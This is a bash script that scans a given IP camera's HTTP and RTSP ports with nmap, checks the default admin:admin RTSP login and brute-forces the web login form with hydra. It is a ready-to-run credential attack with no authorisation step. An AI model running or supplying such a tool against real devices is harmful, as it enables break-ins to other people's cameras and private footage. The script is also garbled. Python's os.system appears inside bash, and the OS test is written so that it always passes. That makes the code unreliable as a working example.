#!/usr/bin/env bash
# camera_enum.sh
# 1. ONVIF & RTSP Camera Enumerator
# Scans ONVIF, RTSP, HTTP ports on IP cameras and tries default creds.
# Usage: ./camera_enum.sh
# Requires: nmap, curl, hydra

function detect_os() { case "$(uname -s)" in Linux*) echo "linux";; Darwin*) echo "darwin";; *) echo "unknown";; esac; }
function ensure_tool() { local t=$1; command -v "$t" &>/dev/null || { echo "[!] Installing $t..."; if [[ "$(detect_os)"=="darwin" ]]; then osascript -e 'tell app "Terminal" to do script "brew install '"$t"'"'; else os.system("sudo apt-get update && sudo apt-get install -y " + t); fi; }; }
function get_credentials() { read -rp "Enter camera IP: " TARGET; }

ensure_tool nmap
ensure_tool curl
ensure_tool hydra
get_credentials

nmap -p80,443,554 -sV --script=banner -oN camera_ports_${TARGET}.txt "$TARGET"
curl -v rtsp://admin:admin@"$TARGET":554 2>&1 | grep "200 OK" && echo "Default RTSP creds admin:admin working"
hydra -L users.txt -P passwords.txt http-get-form "${TARGET}/login:username=^USER^&password=^PASS^:F=Login failed" -o camera_http_creds.txt
